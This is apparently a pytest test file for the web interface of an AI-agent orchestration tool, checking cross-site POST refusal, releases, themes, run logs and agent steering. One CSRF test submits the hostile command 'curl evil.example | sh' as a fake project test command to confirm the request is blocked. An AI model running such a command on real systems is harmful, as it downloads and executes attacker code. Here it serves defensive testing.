def test_pages_render(client, fresh_db):
    fresh_db.upsert_item("may", "issue", 7, "A bug", "alice", "open", "x")
    for path in ("/", "/p/may", "/p/may/settings", "/p/may/issue/7", "/add",
                 "/static/manifest.json", "/static/icon.svg"):
        assert client.get(path).status_code == 200, path


def test_version_in_footer(client):
    from harness import config
    html = client.get("/").text
    assert config.DISPLAY_VERSION in html


def test_question_buttons_and_ntfy_answer(client, fresh_db):
    fresh_db.ask_question("may", "Ruth", "", "Pick one", options=["A", "B"])
    q = fresh_db.open_questions("may")[0]
    assert "option-form" in client.get("/p/may").text
    r = client.post(f"/p/may/question/{q['id']}/answer?via=ntfy",
                    data={"answer": "A"})
    assert r.status_code == 200 and r.json()["ok"] is True


def test_cross_site_post_is_refused(client, fresh_db):
    """The GUI has no auth, so a POST another site set off must not land."""
    xsite = {"Sec-Fetch-Site": "cross-site"}
    r = client.post("/add", data={"name": "evil", "gh_repo": "e/x",
                                  "test_command": "curl evil.example | sh"},
                    headers=xsite, follow_redirects=False)
    assert r.status_code == 403
    assert fresh_db.get_project("evil") is None

    fresh_db.upsert_item("may", "pr", 3, "A PR", "alice", "open", "x")
    assert client.post("/p/may/pr/3/approve", headers=xsite,
                       follow_redirects=False).status_code == 403
    assert fresh_db.get_item("may", "pr", 3)["status"] == "new"

    rid = fresh_db.create_release("may", "1.0.0", "notes", [])
    assert client.post(f"/p/may/release/{rid}/approve", headers=xsite,
                       follow_redirects=False).status_code == 403
    assert fresh_db.get_release(rid)["status"] == "proposed"

    # a tailnet peer's page reads as same-site, which is no better
    assert client.post("/run-now", headers={"Sec-Fetch-Site": "same-site"},
                       follow_redirects=False).status_code == 403


def test_origin_mismatch_refused(client, fresh_db):
    """Browsers too old for Sec-Fetch-Site still send Origin."""
    r = client.post("/add", data={"name": "evil", "gh_repo": "e/x"},
                    headers={"Origin": "https://evil.example"},
                    follow_redirects=False)
    assert r.status_code == 403
    assert fresh_db.get_project("evil") is None


def test_same_origin_post_still_works(client, fresh_db):
    r = client.post("/add", data={"name": "June", "gh_repo": "example/june",
                                  "test_command": "pytest"},
                    headers={"Sec-Fetch-Site": "same-origin",
                             "Origin": "http://testserver"},
                    follow_redirects=False)
    assert r.status_code == 303
    assert fresh_db.get_project("june")["test_command"] == "pytest"


def test_public_url_host_is_accepted(client, fresh_db, monkeypatch):
    """A proxy may rewrite Host; the advertised public URL still counts."""
    from harness import config
    monkeypatch.setattr(config, "PUBLIC_URL", "https://harness.example/")
    r = client.post("/p/may/tell", data={"text": "Focus on bugs"},
                    headers={"Origin": "https://harness.example"},
                    follow_redirects=False)
    assert r.status_code == 303
    assert fresh_db.pending_directives("may")


def test_health_reports_worker_down(client):
    assert client.get("/health").status_code == 503  # no worker in tests


def test_board_shows_live_assignee(client, fresh_db):
    fresh_db.upsert_item("may", "issue", 12, "Busy item", "bob", "open", "x")
    fresh_db.update_item("may", "issue", 12, status="working")
    fresh_db.start_run("may", "ic", "issue#12", "fix", "m", "Dimitri")  # live
    html = client.get("/p/may").text
    assert "Dimitri · working" in html and "assignee live" in html
    assert "1 live" in html


def test_staff_chip_states_and_links(client, fresh_db):
    from harness.web.app import _member_status
    rid = fresh_db.start_run("may", "ic", "issue#1", "fix", "m", "Malcolm")
    fresh_db.finish_run(rid, False, 0.1, 1, "orphaned by restart")
    runs = fresh_db.recent_runs(10, "may")
    m = _member_status("Malcolm", runs, lambda r: r["agent"] == "Malcolm")
    assert m["state"] == "restarted" and "requeued" in m["detail"]
    rid2 = fresh_db.start_run("may", "ic", "issue#2", "fix", "m", "Beth")
    fresh_db.finish_run(rid2, False, 0.1, 1, "tests failed after fix")
    runs = fresh_db.recent_runs(10, "may")
    b = _member_status("Beth", runs, lambda r: r["agent"] == "Beth")
    assert b["state"] == "failed" and "tests failed" in b["detail"]
    assert f"/run/{rid}" in client.get("/").text  # Malcolm is on-roster


def test_directions_visible_after_tell(client, fresh_db):
    r = client.post("/p/may/tell", data={"text": "Focus on bugs this week"},
                    follow_redirects=False)
    assert r.status_code == 303
    html = client.get("/p/may").text
    assert "Focus on bugs this week" in html
    assert "directions-list" in html


def test_theme_defaults_to_light_and_persists(client):
    """No cookie means light, whatever the operating system prefers."""
    html = client.get("/").text
    assert 'data-theme="light"' in html
    assert '<meta name="theme-color" content="#fffdf8">' in html
    assert 'action="/theme"' in html

    r = client.post("/theme", data={"value": "dark"}, follow_redirects=False)
    assert r.status_code == 303
    assert client.cookies.get("theme") == "dark"
    html = client.get("/").text
    assert 'data-theme="dark"' in html
    assert '<meta name="theme-color" content="#1D5741">' in html

    client.cookies.set("theme", "chartreuse")  # junk falls back to light
    assert 'data-theme="light"' in client.get("/").text


def test_theme_post_ignores_a_foreign_referer(client):
    r = client.post("/theme", data={"value": "dark"},
                    headers={"referer": "https://example.com/evil"},
                    follow_redirects=False)
    assert r.status_code == 303 and r.headers["location"] == "/"


def test_run_tail_streams_increments(client, fresh_db, tmp_path):
    rid = fresh_db.start_run("may", "ic", "issue#3", "fix", "m", "Malcolm")
    log = tmp_path / "run.log"
    log.write_text("hello ")
    with fresh_db.conn() as c:
        c.execute("UPDATE runs SET log_path = ? WHERE id = ?", (str(log), rid))
    j = client.get(f"/run/{rid}/tail?offset=0").json()
    assert j["data"] == "hello " and j["live"] is True
    log.write_text("hello world")
    j2 = client.get(f"/run/{rid}/tail?offset={j['offset']}").json()
    assert j2["data"] == "world"
    fresh_db.finish_run(rid, True, 0.1, 1, "done")
    j3 = client.get(f"/run/{rid}/tail?offset={j2['offset']}").json()
    assert j3["live"] is False


def test_run_tail_carries_the_live_facts(client, fresh_db, tmp_path):
    """The strip above the console has to move while the run does, so the
    poller needs the facts back with each chunk — turns and model straight
    away, cost and finished_at once the run is over."""
    rid = fresh_db.start_run("may", "ic", "issue#5", "fix", "sonnet-x", "Malcolm")
    fresh_db.update_run(rid, turns=3)

    # before a log file exists the poller still wants the facts
    j = client.get(f"/run/{rid}/tail?offset=0").json()
    assert j["live"] is True
    assert j["turns"] == 3 and j["model"] == "sonnet-x"
    assert j["started_at"] and j["finished_at"] is None

    log = tmp_path / "run.log"
    log.write_text("working…")
    fresh_db.update_run(rid, log_path=str(log), turns=4)
    j = client.get(f"/run/{rid}/tail?offset=0").json()
    assert j["data"] == "working…"
    assert j["turns"] == 4 and j["model"] == "sonnet-x"
    assert j["finished_at"] is None

    fresh_db.finish_run(rid, True, 0.42, 4, "done", str(log))
    j = client.get(f"/run/{rid}/tail?offset={j['offset']}").json()
    assert j["live"] is False and j["finished_at"]
    assert abs(j["cost_usd"] - 0.42) < 1e-9 and j["turns"] == 4


def test_run_page_carries_the_facts_hooks(client, fresh_db):
    """The strip is server-rendered first; the poller only rewrites the
    spans, so the hooks it writes into have to be on the page."""
    rid = fresh_db.start_run("may", "ic", "issue#6", "fix", "sonnet-x", "Beth")
    fresh_db.update_run(rid, turns=2)
    html = client.get(f"/run/{rid}").text
    assert 'id="run-facts"' in html
    for hook in ("turns", "cost", "model", "status", "elapsed", "finished"):
        assert f'data-fact="{hook}"' in html, hook
    assert "2 messages" in html and "sonnet-x" in html


def test_overview_composer_files_direction(client, fresh_db):
    r = client.post("/tell", data={"project": "may",
                                   "text": "Add CSV export to reports"},
                    follow_redirects=False)
    assert r.status_code == 303
    pend = fresh_db.pending_directives("may")
    assert pend and pend[0]["question"] == "Add CSV export to reports"
    assert "Send to Harry" in client.get("/").text


def test_only_escalations_get_primary_buttons(client, fresh_db):
    fresh_db.ask_question("may", "Ruth", "", "Harrys call", options=["A", "B"])
    fresh_db.ask_question("may", "Adam", "", "Dannys call", options=["X", "Y"])
    adam = [q for q in fresh_db.harry_inbox("may") if q["asked_by"] == "Adam"][0]
    fresh_db.escalate_question(adam["id"])
    html = client.get("/p/may").text
    assert "Needs your decision (1)" in html and "With Harry (1)" in html
    # the operator's own question is answerable at a tap; Harry's is tucked away
    assert html.index("Dannys call") < html.index("Harrys call")
    assert "Answer it yourself instead" in html
    html = client.get("/").text
    assert "Needs your decision (1)" in html


def _queue_item(fresh_db, number=1):
    fresh_db.upsert_item("may", "issue", number, "t", "a", "open", "x")
    fresh_db.update_item("may", "issue", number, status="queued",
                         queued_at=fresh_db.now())


def test_release_now_button_and_request(client, fresh_db):
    _queue_item(fresh_db)
    html = client.get("/p/may").text
    assert "Release now (Colin)" in html
    assert "Release now" in client.get("/").text  # and on the overview card
    r = client.post("/p/may/release/request", follow_redirects=False)
    assert r.status_code == 303
    assert fresh_db.get_setting("release_requested.may") == "1"
    # the button gives way to the pending state, so it cannot be pressed twice
    html = client.get("/p/may").text
    assert "Release requested" in html and "Release now (Colin)" not in html


def test_release_now_is_hidden_with_nothing_to_release(client, fresh_db):
    """Nothing queued and dev level with main: pressing it would only earn a
    "nothing to release" warning next cycle, so it is not offered at all."""
    assert "Release now (Colin)" not in client.get("/p/may").text
    assert "Nothing to release" in client.get("/p/may").text
    assert "Release now" not in client.get("/").text
    # and a stale page that posts anyway changes nothing
    r = client.post("/p/may/release/request", follow_redirects=False)
    assert r.status_code == 303
    assert fresh_db.get_setting("release_requested.may") == ""


def test_release_now_survives_work_landed_outside_the_harness(
        client, fresh_db, monkeypatch):
    """Nothing queued, but dev is ahead of main — there is still a release."""
    from harness import repo
    monkeypatch.setattr(repo, "dev_ahead_count", lambda p: 2)
    assert "Release now (Colin)" in client.get("/p/may").text
    assert "Release now" in client.get("/").text  # and on the overview card
    client.post("/p/may/release/request", follow_redirects=False)
    assert fresh_db.get_setting("release_requested.may") == "1"


def test_release_now_is_refused_while_one_is_open(client, fresh_db):
    _queue_item(fresh_db)
    fresh_db.create_release("may", "1.0.0", "notes", [])
    client.post("/p/may/release/request", follow_redirects=False)
    assert fresh_db.get_setting("release_requested.may") == ""
    assert "Release now (Colin)" not in client.get("/p/may").text


def test_settings_explains_auto_release(client, fresh_db):
    """The row is labelled for what it does, and the page alone says what
    each mode means."""
    html = client.get("/p/may/settings").text
    assert "auto release" in html
    assert "merges" in html and "tags it without asking" in html
    assert "waits for your click" in html
    # the two numbers that decide when it fires sit with it
    assert "release after this many changes" in html
    assert "cut release" not in html  # the raw key is never shown as a label


def _release_mode(client, project):
    """The mode the cut_release row on a settings page is showing."""
    html = client.get(f"/p/{project}/settings").text
    form = html.split("/policy/cut_release\"", 1)[1].split("</form>", 1)[0]
    return "auto" if 'value="auto" selected' in form else "approve"


def test_new_projects_still_default_to_approve(client, fresh_db):
    assert fresh_db.policy("may", "cut_release") == "approve"
    assert _release_mode(client, "may") == "approve"


def test_auto_release_is_per_project(client, fresh_db):
    fresh_db.create_project("june", "example/june")
    fresh_db.set_policy("may", "cut_release", "auto")
    assert fresh_db.policy("june", "cut_release") == "approve"
    assert _release_mode(client, "may") == "auto"
    assert _release_mode(client, "june") == "approve"
    assert "pill ok\">auto release" not in client.get("/p/june").text


def test_auto_release_is_visible_on_the_project(client, fresh_db):
    assert "pill ok\">auto" not in client.get("/p/may").text
    fresh_db.set_policy("may", "cut_release", "auto")
    html = client.get("/p/may").text
    assert "pill ok\">auto" in html
    assert "merges and tags itself" in html


def test_auto_release_shows_on_overview_and_is_not_your_queue(client, fresh_db):
    fresh_db.create_release("may", "1.0.0", "notes", [])
    assert "release v1.0.0 proposed" in client.get("/").text
    fresh_db.set_policy("may", "cut_release", "auto")
    html = client.get("/").text
    assert "auto release" in html and "release v1.0.0 going out" in html


def test_live_console_keeps_polling_before_the_log_exists(client, fresh_db):
    """A live run with nothing written yet must not report live=False — the
    poller stops for good on that, which reads as a stalled agent."""
    rid = fresh_db.start_run("may", "ic", "issue#4", "fix", "m", "Dimitri")
    j = client.get(f"/run/{rid}/tail?offset=0").json()
    assert j["data"] == "" and j["live"] is True
    fresh_db.finish_run(rid, True, 0.1, 3, "done")
    assert client.get(f"/run/{rid}/tail?offset=0").json()["live"] is False


def test_overview_release_button_overrides_the_thresholds(client, fresh_db):
    """One queued change is under the default batch of three; the override
    exists precisely so that does not mean waiting."""
    _queue_item(fresh_db)
    assert "Release now" in client.get("/").text
    client.post("/p/may/release/request", follow_redirects=False)
    html = client.get("/").text
    assert "release requested" in html and "Release now" not in html

    from harness import pipeline
    # one queued item, threshold three: only the request gets it over the line
    assert len(pipeline._release_due(fresh_db.get_project("may"))) == 1


def test_add_control_is_an_icon_with_a_name(client):
    """No label, but a screen reader and a hover still say what it does."""
    html = client.get("/").text
    assert "+ add" not in html
    assert 'class="nav-add" href="/add" aria-label="Add a project"' in html
    assert 'title="Add a project"' in html


def test_nav_marks_the_project_you_are_looking_at(client, fresh_db):
    fresh_db.create_project("june", "example/june")
    fresh_db.upsert_item("may", "issue", 7, "A bug", "alice", "open", "x")
    rid = fresh_db.start_run("may", "ic", "issue#7", "fix", "m", "Malcolm")
    for path in ("/p/may", "/p/may/settings", "/p/may/issue/7", f"/run/{rid}"):
        html = client.get(path).text
        assert '<a href="/p/may" aria-current="page">' in html, path
        assert html.count('aria-current="page"') == 1, path  # not june too
    assert 'aria-current="page"' not in client.get("/").text

    # a disabled project still reads as disabled while it is the active one
    fresh_db.update_project("may", enabled=0)
    assert '<a href="/p/may" class="dim" aria-current="page">' in \
        client.get("/p/may").text
def test_item_thread_and_run_steer(client, fresh_db):
    fresh_db.upsert_item("may", "issue", 9, "Footer", "a", "open", "x")
    fresh_db.thread_append("may", "issue#9", "Ruth", "finding", "It is a bug.")
    html = client.get("/p/may/issue/9").text
    assert "It is a bug." in html and "Thread (1)" in html
    # a direction on the item lands in the thread
    client.post("/p/may/tell", data={"text": "Plain text footer", "item_key": "issue#9"})
    assert any("Plain text footer" in r["text"] for r in fresh_db.thread("may", "issue#9"))
    # steering a live run queues the message and mirrors it to the thread
    rid = fresh_db.start_run("may", "ic", "issue#9", "fix", "m", "Malcolm")
    html = client.get(f"/run/{rid}").text
    assert "Tell Malcolm while they work" in html
    client.post(f"/run/{rid}/steer", data={"text": "skip the git probe"})
    steers = fresh_db.take_steers(rid)
    assert [s["text"] for s in steers] == ["skip the git probe"]
    assert fresh_db.take_steers(rid) == []              # delivered once
    assert any("skip the git probe" in r["text"] for r in fresh_db.thread("may", "issue#9"))
    fresh_db.finish_run(rid, True, 0.1, 1, "done")
    assert "Tell Malcolm while they work" not in client.get(f"/run/{rid}").text


def test_thread_kind_filter_and_pinned_binding_entries(client, fresh_db):
    """The thread is the hand-off artefact and gets long: the operator has to
    be able to pick out what Harry ruled and what they themselves directed."""
    fresh_db.upsert_item("may", "issue", 21, "Long thread", "a", "open", "x")
    fresh_db.thread_append("may", "issue#21", "Ruth", "finding", "FINDING-ENTRY")
    fresh_db.thread_append("may", "issue#21", "Harry", "ruling", "RULING-ENTRY")
    fresh_db.thread_append("may", "issue#21", "Danny", "direction",
                           "DIRECTION-ENTRY")
    fresh_db.thread_append("may", "issue#21", "harness", "test",
                           "\n".join(f"test output line {i}" for i in range(40)))

    html = client.get("/p/may/issue/21").text        # everything, by default
    for text in ("FINDING-ENTRY", "RULING-ENTRY", "DIRECTION-ENTRY",
                 "test output line 39"):
        assert text in html, text
    assert "?kind=ruling" in html                    # the filter links
    assert "thread-pinned" in html                   # the binding block
    assert "<details" in html                        # long entry folded away
    assert "Thread (4)" in html                      # the count stays a total

    ruled = client.get("/p/may/issue/21?kind=ruling").text
    assert "RULING-ENTRY" in ruled
    assert "FINDING-ENTRY" not in ruled              # filtered out
    assert "test output line 39" not in ruled
    # rulings and directions bind every agent: they stay whatever the filter
    assert "DIRECTION-ENTRY" in ruled and "thread-pinned" in ruled

    # a filter nobody offers falls back to showing everything
    assert "FINDING-ENTRY" in client.get("/p/may/issue/21?kind=nonsense").text


def test_run_followup_queues_direction_without_steering(client, fresh_db):
    from harness import agents
    fresh_db.upsert_item("may", "issue", 11, "Footer", "a", "open", "x")
    rid = fresh_db.start_run("may", "ic", "issue#11", "fix", "m", "Malcolm")

    html = client.get(f"/run/{rid}").text
    assert f"/run/{rid}/followup" in html          # offered alongside the steer

    r = client.post(f"/run/{rid}/followup",
                    data={"text": "add a note to the changelog"},
                    follow_redirects=False)
    assert r.status_code == 303

    # it lands on the item thread as a direction, not in the live session
    thread = fresh_db.thread("may", "issue#11")
    assert any(t["kind"] == "direction" and "changelog" in t["text"]
               for t in thread)
    assert fresh_db.take_steers(rid) == []
    assert any(q["item_key"] == "issue#11" and "changelog" in q["question"]
               for q in fresh_db.pending_directives("may"))

    # and the next agent on the item reads it as binding context
    assert "changelog" in agents._item_context("may", "issue#11")

    # the run page shows it as queued rather than delivered
    assert "Queued for after" in client.get(f"/run/{rid}").text


def test_run_followup_hidden_without_item(client, fresh_db):
    rid = fresh_db.start_run("may", "lead", "", "plan", "m", "Harry")
    assert f"/run/{rid}/followup" not in client.get(f"/run/{rid}").text
